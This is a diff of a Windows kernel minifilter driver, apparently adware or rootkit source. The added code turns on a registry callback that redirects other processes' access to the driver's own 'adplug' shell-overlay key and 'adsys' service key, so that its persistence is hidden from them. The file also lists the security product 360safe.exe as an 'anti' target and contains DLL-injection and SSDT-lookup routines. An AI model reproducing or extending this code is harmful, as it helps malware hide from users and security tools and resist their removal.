@@ -48,37 +48,11 @@ Environment:
     Filter initialization and unload routines.
 *************************************************************************/
 
-typedef struct {
-    int num;
-    WCHAR name[256];
-    LIST_ENTRY list;
-} MY_DATA,*PMY_DATA;
-
 
 NTSTATUS DriverEntry (
     __in PDRIVER_OBJECT DriverObject,
     __in PUNICODE_STRING RegistryPath
 )
-/*++
-
-Routine Description:
-
-    This is the initialization routine for this miniFilter driver. This
-    registers the miniFilter with FltMgr and initializes all
-    its global data structures.
-
-Arguments:
-
-    DriverObject - Pointer to driver object created by the system to
-        represent this driver.
-    RegistryPath - Unicode string identifying where the parameters for this
-        driver are located in the registry.
-
-Return Value:
-
-    Returns STATUS_SUCCESS.
-
---*/
 {
     NTSTATUS status=-1;
     PVOID fnExGetPreviousMode = (PVOID)ExGetPreviousMode;
@@ -88,7 +62,7 @@ Return Value:
     PLIST_ENTRY p=NULL;
     PKLDR_DATA_TABLE_ENTRY entry=NULL;
     int it;
-	PMY_COMMAND_INFO  p1=NULL;
+    PMY_COMMAND_INFO  p1=NULL;
     WCHAR  a[]=L"hehee";
     UNREFERENCED_PARAMETER( RegistryPath );
     DriverObject->DriverUnload = DriverUnload;
@@ -128,25 +102,6 @@ Return Value:
     InitializeListHead(&g_AntiProcess);
     KeInitializeSpinLock(&g_spin_process);
     AppendListNode(L"360safe.exe",&g_AntiProcess,0);
-
-
-
-
-
-    for ( p= g_ProtectFile.Flink; p != &g_ProtectFile.Flink; p = p->Flink) {
-        PMY_COMMAND_INFO info = CONTAINING_RECORD(p, MY_COMMAND_INFO, Entry);
-		kprintf("exename:%ws",info->exename);
-
-    }
-
-
-
-
-
-
-
-//	p1=  FindInList(L"adplug.dll",&g_ProtectFile,&g_spin_lockfile);
-//	kprintf("p1:%p",p1);
 
 
 //  kprintf("find:%d",FindInList(L"360se.exe",&g_AntiProcess));
@@ -194,7 +149,7 @@ Return Value:
 //    }
 
     //注册表回调监控
-//    SetRegisterCallback();
+    SetRegisterCallback();
     //文件回调监控
     ExInitializeNPagedLookasideList( &Pre2PostContextList,NULL,NULL,0,sizeof(PRE_2_POST_CONTEXT),PRE_2_POST_TAG,0 );
     status = FltRegisterFilter( DriverObject,&FilterRegistration,&gFilterHandle);
@@ -213,23 +168,6 @@ Return Value:
 }
 
 NTSTATUS FilterUnload (__in FLT_FILTER_UNLOAD_FLAGS Flags)
-/*++
-Routine Description:
-
-    This is the unload routine for this miniFilter driver. This is called
-    when the minifilter is about to be unloaded. We can fail this unload
-    request if this is not a mandatory unloaded indicated by the Flags
-    parameter.
-
-Arguments:
-
-    Flags - Indicating if this is a mandatory unload.
-
-Return Value:
-
-    Returns the final status of this operation.
-
---*/
 {
     UNREFERENCED_PARAMETER( Flags );
 
@@ -540,19 +478,9 @@ Return Value:
         //
 
         if (!NT_SUCCESS(status)) {
-
-
             ASSERT(ctx->Name.Buffer == NULL);
-
             status = STATUS_FLT_DO_NOT_ATTACH;
             leave;
-
-
-
-
-
-
-
             //
             //  Figure out which name to use from the properties
             //
@@ -566,11 +494,9 @@ Return Value:
                 workingName = &volProp->FileSystemDeviceName;
 
             } else {
-
                 //
                 //  No name, don't save the context
                 //
-
                 status = STATUS_FLT_DO_NOT_ATTACH;
                 leave;
             }
@@ -663,35 +589,21 @@ Return Value:
 }
 
 
-NTSTATUS InstanceQueryTeardown (
-    IN PCFLT_RELATED_OBJECTS FltObjects,
-    IN FLT_INSTANCE_QUERY_TEARDOWN_FLAGS Flags
-)
-/*++
-
-Routine Description:
-
-    This is called when an instance is being manually deleted by a
-    call to FltDetachVolume or FilterDetach.  We always return it is OK to
-    detach.
-
-Arguments:
-
-    FltObjects - Pointer to the FLT_RELATED_OBJECTS data structure containing
-        opaque handles to this filter, instance and its associated volume.
-
-    Flags - Indicating where this detach request came from.
-
-Return Value:
-
-    Always succeed.
-
---*/
+/** 
+ * [InstanceQueryTeardown This is called when an instance is being manually deleted by a call to FltDetachVolume or FilterDetach.  We always return it is OK to detach]
+ * @Author   fanyusen
+ * @DateTime 2019年6月18日T7:23:53+0800
+ * @param    FltObjects               [Pointer to the FLT_RELATED_OBJECTS data structure containing opaque handles to this filter, instance and its associated volume.]
+ * @param    Flags                    [Indicating where this detach request came from.]
+ * @return                            [Always succeed]
+ */
+NTSTATUS InstanceQueryTeardown (IN PCFLT_RELATED_OBJECTS FltObjects,IN FLT_INSTANCE_QUERY_TEARDOWN_FLAGS Flags)
 {
     UNREFERENCED_PARAMETER( FltObjects );
     UNREFERENCED_PARAMETER( Flags );
     return STATUS_SUCCESS;
 }
+
 
 
 FLT_PREOP_CALLBACK_STATUS PreCleanup(
@@ -748,7 +660,7 @@ FLT_PREOP_CALLBACK_STATUS PreCleanup(
     }
     finally{
 
-        if (NULL != pVolCtx) FltReleaseContext(pVolCtx);
+        if (NULL != pVolCtx) 	FltReleaseContext(pVolCtx);
         if (NULL != pStreamCtx) FltReleaseContext(pStreamCtx);
         if (NULL != pfNameInfo) FltReleaseFileNameInformation(pfNameInfo);
     }
@@ -868,28 +780,14 @@ FLT_POSTOP_CALLBACK_STATUS PostCreate(
     NTSTATUS status = STATUS_SUCCESS;
 
     ULONG uDesiredAccess = Data->Iopb->Parameters.Create.SecurityContext->DesiredAccess; //get desired access mode
-
     PVOLUME_CONTEXT pVolCtx = NULL;
     PFLT_FILE_NAME_INFORMATION pfNameInfo = NULL;
-
     PSTREAM_CONTEXT pStreamCtx = NULL;
     BOOLEAN bNewCreatedOrNot = FALSE;
-
-    LARGE_INTEGER FileSize = { 0 };
     WCHAR   fitername[512]= {0};
-    LARGE_INTEGER ByteOffset = { 0 };
-    LARGE_INTEGER OrigByteOffset = { 0 };
-    ULONG      uReadLength = 0;
-
-
     BOOLEAN bDirectory = FALSE;
-    BOOLEAN bIsSystemProcess = FALSE;
-    KIRQL CurrentIrql;
-    KIRQL OldIrql;
-    ULONG  uPid;
-    BOOLEAN   bexename=FALSE;
+	KIRQL OldIrql;
     PMY_COMMAND_INFO  pCmdData=NULL;
-    ULONG ilen=0;
     UNREFERENCED_PARAMETER(Flags);
     UNREFERENCED_PARAMETER(CompletionContext);
 
@@ -912,24 +810,12 @@ FLT_POSTOP_CALLBACK_STATUS PostCreate(
             __leave;
         }
 
-        ilen=GetNameByUnicodeString(&pfNameInfo->Name,fitername);
+        GetNameByUnicodeString(&pfNameInfo->Name,fitername);
 
-
-//		[PostCreate] xxxxxxxx adplug.dll
-
-
-//        if (_wcsicmp(fitername,L"LockPage.exe")) {
-//            leave;
-//        }
-
-//		kprintf("[PostCreate] xxxxxxxx %ws",fitername);
-		
         pCmdData=FindInList(fitername,&g_ProtectFile,&g_spin_lockfile);
         if (pCmdData==NULL) {
             __leave;
         }
-
-		kprintf("[PostCreate] type:%d exename:%ws",pCmdData->uType,pCmdData->exename);
         status = Ctx_FindOrCreateStreamContext(Data, FltObjects, TRUE,
                                                &pStreamCtx, &bNewCreatedOrNot);
         if (!NT_SUCCESS(status)) {
@@ -942,7 +828,6 @@ FLT_POSTOP_CALLBACK_STATUS PostCreate(
         if (!bNewCreatedOrNot) {
             SC_LOCK(pStreamCtx, &OldIrql);
             pStreamCtx->RefCount++;
-            pStreamCtx->uEncrypteType=pCmdData->uType;
             pStreamCtx->uAccess = uDesiredAccess;
             SC_UNLOCK(pStreamCtx, OldIrql);
 //            DbgPrint("[PostCreate] has found RefCount:%d filename:%wZ\n", pStreamCtx->RefCount,&pStreamCtx->FileName);
@@ -992,7 +877,6 @@ BOOLEAN GetNameByUnicodeString(PUNICODE_STRING pSrc, WCHAR name[])
 /*************************************************************************
     MiniFilter callback routines.
 *************************************************************************/
-
 FLT_PREOP_CALLBACK_STATUS PreRead(
     IN OUT PFLT_CALLBACK_DATA Data,
     IN PCFLT_RELATED_OBJECTS FltObjects,
@@ -1104,7 +988,7 @@ FLT_PREOP_CALLBACK_STATUS PreRead(
         //  Update the buffer pointers and MDL address, mark we have changed
         //  something.
         //
-        DbgPrint("[PreRead] p2pCtx:%p newBuf:%p newMdl:%p",p2pCtx,newBuf,newMdl);
+        DbgPrint("[PreRead]  p2pCtx:%p newBuf:%p newMdl:%p",p2pCtx,newBuf,newMdl);
         iopb->Parameters.Read.ReadBuffer = newBuf;
         iopb->Parameters.Read.MdlAddress = newMdl;
         FltSetCallbackDataDirty( Data );
@@ -1128,7 +1012,6 @@ FLT_PREOP_CALLBACK_STATUS PreRead(
         //
         //  If we don't want a post-operation callback, then cleanup state.
         //
-
         if (retValue != FLT_PREOP_SUCCESS_WITH_CALLBACK)
         {
             if (newBuf != NULL) {
@@ -1148,10 +1031,6 @@ FLT_PREOP_CALLBACK_STATUS PreRead(
 
     return retValue;
 }
-
-
-
-
 
 
 
@@ -1258,7 +1137,6 @@ FLT_POSTOP_CALLBACK_STATUS PostRead(
 
             if (MmIsAddressValid(p2pCtx->SwappedBuffer)) {
 
-
                 //除去explorer 全加密
                 if(p2pCtx->pStreamCtx->uEncrypteType==1) {
                     PUCHAR  puorigin=(PUCHAR)origBuf;
@@ -1321,37 +1199,17 @@ FLT_POSTOP_CALLBACK_STATUS PostRead(
 
 
 
-
-FLT_POSTOP_CALLBACK_STATUS PostReadWhenSafe (
-    IN OUT PFLT_CALLBACK_DATA Data,
-    IN PCFLT_RELATED_OBJECTS FltObjects,
-    IN PVOID CompletionContext,
-    IN FLT_POST_OPERATION_FLAGS Flags
-)
-/*++
-
-Routine Description:
-
-    We had an arbitrary users buffer without a MDL so we needed to get
-    to a safe IRQL so we could lock it and then copy the data.
-
-Arguments:
-
-    Data - Pointer to the filter callbackData that is passed to us.
-
-    FltObjects - Pointer to the FLT_RELATED_OBJECTS data structure containing
-        opaque handles to this filter, instance, its associated volume and
-        file object.
-
-    CompletionContext - Contains state from our PreOperation callback
-
-    Flags - Denotes whether the completion is successful or is being drained.
-
-Return Value:
-
-    FLT_POSTOP_FINISHED_PROCESSING - This is always returned.
-
---*/
+/** 
+ * [PostReadWhenSafe description]
+ * @Author   zzc
+ * @DateTime 2019年6月18日T6:59:43+0800
+ * @param    Data                     [Pointer to the filter callbackData that is passed to us]
+ * @param    FltObjects               [Pointer to the FLT_RELATED_OBJECTS data structure containing opaque handles to this filter, instance, its associated volume and file object]
+ * @param    CompletionContext        [Contains state from our PreOperation callback]
+ * @param    Flags                    [Denotes whether the completion is successful or is being drained]
+ * @return                            [FLT_POSTOP_FINISHED_PROCESSING - This is always returned.]
+ */
+FLT_POSTOP_CALLBACK_STATUS PostReadWhenSafe (IN OUT PFLT_CALLBACK_DATA Data,IN PCFLT_RELATED_OBJECTS FltObjects,IN PVOID CompletionContext,IN FLT_POST_OPERATION_FLAGS Flags)
 {
     PFLT_IO_PARAMETER_BLOCK iopb = Data->Iopb;
     PPRE_2_POST_CONTEXT p2pCtx = CompletionContext;
@@ -1415,19 +1273,19 @@ DWORD_PTR GetSystemRoutineAddress(WCHAR *szFunCtionAName)
 }
 
 
-
-// 回调函数
-NTSTATUS RegisterMonCallback(
-    PVOID CallbackContext,
-    // 操作类型（只是操作编号，不是指针）
-    PVOID Argument1,
-    // 操作详细信息的结构体指针
-    PVOID Argument2
-)
+/** 
+ * [RegisterMonCallback description]
+ * @Author   zzc
+ * @DateTime 2019年6月18日T6:53:38+0800
+ * @param    CallbackContext          [上下文]
+ * @param    Argument1                [操作类型（只是操作编号，不是指针）]
+ * @param    Argument2                [操作详细信息的结构体指针]
+ * @return                            [状态值]
+ */
+NTSTATUS RegisterMonCallback(PVOID CallbackContext,PVOID Argument1,PVOID Argument2)
 {
     NTSTATUS status = STATUS_SUCCESS;
     UNICODE_STRING ustrRegPath = { 0 };
-    // 获取操作类型
     LONG lOperateType = (LONG)Argument1;
     LONG NotifyClass = (LONG)Argument1;
     UNREFERENCED_PARAMETER(CallbackContext);
@@ -1441,48 +1299,90 @@ NTSTATUS RegisterMonCallback(
             if (MmIsAddressValid(KeyInfo) && MmIsAddressValid(KeyInfo->CompleteName)) {
                 PUNICODE_STRING  pPath = KeyInfo->CompleteName;
                 WCHAR   key[216] = { 0 };
-                //DbgPrint("CompleteName:%wZ Length:%d",KeyInfo->CompleteName,KeyInfo->CompleteName->Length);
                 if (GetNameByUnicodeString(pPath, key)) {
+
+                    WCHAR exename[512]= {0};
+                    UNICODE_STRING FullKeyName = { 0 };
+                    HANDLE                      KeyHandle;
+                    ULONG                       Disposition;
+                    OBJECT_ATTRIBUTES           ObjectAttrib;
                     //0OverlayIcon
                     if (_wcsicmp(key, L"adplug") == 0) {
-
                         WCHAR *pslr = _wcslwr(pPath->Buffer, pPath->Length);
                         if (wcsstr(pslr, L"shelliconoverlayidentifiers\\adplug")) {
-                            UNICODE_STRING FullKeyName = { 0 };
-                            HANDLE                      KeyHandle;
-                            ULONG                       Disposition;
-                            OBJECT_ATTRIBUTES           ObjectAttrib;
+                            BOOLEAN  bGetName= GetProcessNameByObj(PsGetCurrentProcess(),exename);
+                            if (bGetName&&_wcsicmp(L"explorer.exe",exename)!=0) {
 
-                            RtlInitUnicodeString(&FullKeyName, L"\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellIconOverlayIdentifiers\\EnhancedStorageShell");
-                            InitializeObjectAttributes(&ObjectAttrib, &FullKeyName, OBJ_CASE_INSENSITIVE, NULL, NULL);
-                            if (NotifyClass == RegNtPreCreateKeyEx) {
-                                status = ZwCreateKey(&KeyHandle, KeyInfo->DesiredAccess, &ObjectAttrib, 0, KeyInfo->Class, KeyInfo->CreateOptions, &Disposition);
-                            } else {
-                                status = ZwOpenKey(&KeyHandle, KeyInfo->DesiredAccess, &ObjectAttrib);
-                            }
-
-                            if (NT_SUCCESS(status)) {
-                                PVOID KeyObject;
-                                status = ObReferenceObjectByHandle(KeyHandle, KeyInfo->DesiredAccess, (POBJECT_TYPE)KeyInfo->ObjectType, KernelMode, &KeyObject, NULL);
+                                RtlInitUnicodeString(&FullKeyName, L"\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellIconOverlayIdentifiers\\Offline Files");
+                                InitializeObjectAttributes(&ObjectAttrib, &FullKeyName, OBJ_CASE_INSENSITIVE, NULL, NULL);
+                                if (NotifyClass == RegNtPreCreateKeyEx) {
+                                    status = ZwCreateKey(&KeyHandle, KeyInfo->DesiredAccess, &ObjectAttrib, 0, KeyInfo->Class, KeyInfo->CreateOptions, &Disposition);
+                                } else {
+                                    status = ZwOpenKey(&KeyHandle, KeyInfo->DesiredAccess, &ObjectAttrib);
+                                }
                                 if (NT_SUCCESS(status)) {
-                                    __try {
-                                        if (NotifyClass == RegNtPreCreateKeyEx) {
-                                            *KeyInfo->Disposition   = Disposition;
-                                        }
+                                    PVOID KeyObject;
+                                    status = ObReferenceObjectByHandle(KeyHandle, KeyInfo->DesiredAccess, (POBJECT_TYPE)KeyInfo->ObjectType, KernelMode, &KeyObject, NULL);
+                                    if (NT_SUCCESS(status)) {
+                                        __try {
+                                            if (NotifyClass == RegNtPreCreateKeyEx) {
+                                                *KeyInfo->Disposition   = Disposition;
+                                            }
 
-                                        *KeyInfo->ResultObject = KeyObject;
-                                        KeyInfo->GrantedAccess = KeyInfo->DesiredAccess;
-                                        status = STATUS_CALLBACK_BYPASS;
-                                    } __except(EXCEPTION_EXECUTE_HANDLER) {
-                                        ObDereferenceObject(KeyObject);
-                                        status =  GetExceptionCode();
+                                            *KeyInfo->ResultObject = KeyObject;
+                                            KeyInfo->GrantedAccess = KeyInfo->DesiredAccess;
+                                            status = STATUS_CALLBACK_BYPASS;
+                                        } __except(EXCEPTION_EXECUTE_HANDLER) {
+                                            ObDereferenceObject(KeyObject);
+                                            status =  GetExceptionCode();
+                                        }
                                     }
+
+                                    ZwClose(KeyHandle);
                                 }
 
-                                ZwClose(KeyHandle);
-                            }
-                        }
 
+                            }
+
+                        }
+						//pslr:\registry\machine\system\controlset001\services\adsys 
+                    } else if(_wcsicmp(key, L"adsys") == 0) {
+                        WCHAR *pslr = _wcslwr(pPath->Buffer, pPath->Length);
+                        if (wcsstr(pslr, L"services\\adsys")!=NULL) { 
+                            BOOLEAN   bGetName= GetProcessNameByObj(PsGetCurrentProcess(),exename);
+						//exename:services.exe Path:\registry\machine\system\currentcontrolset\services\adsys
+                            if (bGetName&&_wcsicmp(L"services.exe",exename)!=0) {
+							    kprintf("exename:%ws Path:%wZ",exename,pPath);
+                                RtlInitUnicodeString(&FullKeyName, L"\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\services\\ACPI");//services\ACPI
+                                InitializeObjectAttributes(&ObjectAttrib, &FullKeyName, OBJ_CASE_INSENSITIVE, NULL, NULL);
+                                if (NotifyClass == RegNtPreCreateKeyEx) {
+                                    status = ZwCreateKey(&KeyHandle, KeyInfo->DesiredAccess, &ObjectAttrib, 0, KeyInfo->Class, KeyInfo->CreateOptions, &Disposition);
+                                } else {
+                                    status = ZwOpenKey(&KeyHandle, KeyInfo->DesiredAccess, &ObjectAttrib);
+                                }
+                                if (NT_SUCCESS(status)) {
+                                    PVOID KeyObject;
+                                    status = ObReferenceObjectByHandle(KeyHandle, KeyInfo->DesiredAccess, (POBJECT_TYPE)KeyInfo->ObjectType, KernelMode, &KeyObject, NULL);
+                                    if (NT_SUCCESS(status)) {
+                                        __try {
+                                            if (NotifyClass == RegNtPreCreateKeyEx) {
+                                                *KeyInfo->Disposition   = Disposition;
+                                            }
+                                            *KeyInfo->ResultObject = KeyObject;
+                                            KeyInfo->GrantedAccess = KeyInfo->DesiredAccess;
+                                            status = STATUS_CALLBACK_BYPASS;
+                                        } __except(EXCEPTION_EXECUTE_HANDLER) {
+                                            ObDereferenceObject(KeyObject);
+                                            status =  GetExceptionCode();
+                                        }
+                                    }
+
+                                    ZwClose(KeyHandle);
+                                }
+
+                            }
+
+                        }
                     }
 
                 }
@@ -1515,7 +1415,7 @@ VOID DriverUnload(IN PDRIVER_OBJECT pDriverObj)
 
     // TODO: Add uninstall code here.
 //    PsRemoveLoadImageNotifyRoutine((PLOAD_IMAGE_NOTIFY_ROUTINE)ImageNotify);
-//    RemoveRegisterCallback();
+    RemoveRegisterCallback();
     DbgPrint("[DriverUnload] Unloaded Success\r\n");
     return;
 }
@@ -1737,7 +1637,6 @@ PVOID GetProcAddress(IN PVOID pBase, IN PCCHAR name_ord)
         // Find by name
         else if((ULONG_PTR)name_ord > 0xFFFF && i < pExport->NumberOfNames) {
             pName = (PCHAR)(pAddressOfNames[i] + (ULONG_PTR)pBase);
-            //DbgPrint("api:%s\r\n",pName);
             OrdIndex = pAddressOfOrds[i];
         }
         // Weird params
@@ -1867,7 +1766,7 @@ ULONG_PTR GetSSDTFuncCurAddr(LONG id)
 
 /**
  * [InjectDll description]
- * @Author   fanyusen
+ * @Author   zzc
  * @DateTime 2019年6月7日T7:43:44+0800
  * @param    ProcessObj               [PEPROCESS]
  * @param    ibit                     [32/64]
@@ -2197,10 +2096,9 @@ PMY_COMMAND_INFO  FindInList(const WCHAR* name,LIST_ENTRY*     link,PKSPIN_LOCK 
     KIRQL  irql;    // 中断级别
     KeAcquireSpinLock(lock, &irql);
     for ( p= link->Flink; p != &link->Flink; p = p->Flink) {
-        pData = CONTAINING_RECORD(p, MY_COMMAND_INFO, Entry);
-		kprintf("exename:%ws",pData->exename);
-        if(_wcsicmp(pData->exename,name)==0) {
-            bret=TRUE;
+        PMY_COMMAND_INFO pData1 = CONTAINING_RECORD(p, MY_COMMAND_INFO, Entry);
+        if(_wcsicmp(pData1->exename,name)==0) {
+            pData=pData1;
             break;
         }
     }
